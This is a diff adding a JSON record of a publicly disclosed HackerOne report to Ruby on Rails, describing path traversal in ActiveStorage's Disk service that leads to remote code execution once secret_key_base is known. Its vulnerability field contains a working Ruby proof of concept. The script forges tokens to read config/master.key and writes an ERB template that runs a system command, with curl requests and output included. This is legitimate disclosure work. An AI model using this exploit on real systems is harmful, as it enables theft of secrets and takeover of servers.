@@ -1,0 +1,134 @@
+{
+  "id": 2334455,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzM0NDU1",
+  "url": "https://hackerone.com/reports/2334455",
+  "title": "Path traversal in AcitveStorage, and lead RCE",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2024-01-25T14:17:58.938Z",
+  "submitted_at": "2024-01-25T14:17:59.094Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-10-08T20:26:06.327Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-02-11T02:55:44.845Z",
+  "team_member_agreed_on_going_public_at": "2024-10-08T20:26:06.062Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The danger of deserialization has been reduced in Rails 7.1 by increasing the number of settings that do not use Marshal in MessageVerifier.\n\nHowever, another danger remains with AcitveStorage(`service: Disk`), which allows path traversal using the `key` value. However, the attacker must know the value of `secret_key_base`.\n\n### PoC\n\n```\n❯ ruby -v\nruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [arm64-darwin22]\n\n❯ rails new disk_traversal_7_1 -G -M -C -A -J -T \n=>  Rails 7.1.3\n\n❯ bin/rails active_storage:install\n\n❯ RAILS_ENV=production bin/rails db:migrate\n```\n\nedit `config/production.rb`\n\n```\n# config.force_ssl = true\n...\n\nconfig.active_support.message_serializer = :json\n```\n\nstart server\n\n```\n❯ RAILS_ENV=production bundle exec rails s\n```\n\n`traversal.rb`\n\n```ruby\ncontent_disposition = \"inline\"\ncontent_type = \"text/plain\"\nname = \"disk\"\n\nsecret_key_base = Rails.application.secret_key_base\n\nkey_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))\nsecret = key_generator.generate_key(\"ActiveStorage\")\n\nserializer =  ActiveStorage.verifier.instance_variable_get(:@serializer)\nputs serializer\nputs \"--\"\n\n\nkey =\"././../config/master.key\"\nverifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)\nread_token = verifier.generate(\n          {\n            key: key,\n            disposition: content_disposition,\n            content_type: content_type,\n            service_name: name\n          },\n          purpose: :blob_key\n        )\n\nputs \"read token:\"\nputs \"#{read_token}\"\nputs \"read curl: \"\nputs  \"curl \\\"http://0.0.0.0:3000/rails/active_storage/disk/#{read_token}/test\\\"\"\nputs \"--\"\n\ntarget_file =\"../app/views/users/show.text.erb\"\ncontent = \"<% system('date') %>\"\nverifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)\ntoken_write = verifier.generate(\n          {\n            key: target_file,\n            disposition: content_disposition,\n            content_type: content_type,\n            content_length: content.bytesize,\n            service_name: name\n          },\n          purpose: :blob_token\n        )\n\nputs \"write target_file:\"\nputs \"#{target_file}\"\nputs \"write token:\"\nputs \"#{token_write}\"\nputs \"write curl:\"\nputs \"curl -X PUT -H \\\"Content-type: #{content_type}\\\" -d \\\"#{content}\\\" http://0.0.0.0:3000/rails/active_storage/disk/#{token_write}\"\n```\n\n```\n❯ RAILS_ENV=production bundle exec rails runner traversal.rb\nW, [2024-01-25T22:57:10.036960 #16497]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting \"config.active_record.sqlite3_production_warning=false\".\nActiveSupport::Messages::SerializerWithFallback::JsonWithFallback\n--\nread token:\neyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7\nread curl:\ncurl \"http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test\"\n--\nwrite target_file:\n../app/views/users/show.text.erb\nwrite token:\neyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e\nwrite curl:\ncurl -X PUT -H \"Content-type: text/plain\" -d \"<% system('date') %>\" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e\n```\n\nAccess to read curl will get the file at any path, and access to write curl will write to any path and confirm the RCE.\n\n## Impact\n\nIf `secret_key_base` is leaked, there is a risk of reading and writing files on the server and thereby an RCE.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 37,
+  "voters": [
+    "k0ns0l",
+    "maskopatol",
+    "zy9ard3",
+    "scyoon",
+    "anonxr",
+    "inscryption",
+    "thalaivar304",
+    "jmo740",
+    "2026",
+    "0xleonidas",
+    "and 27 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
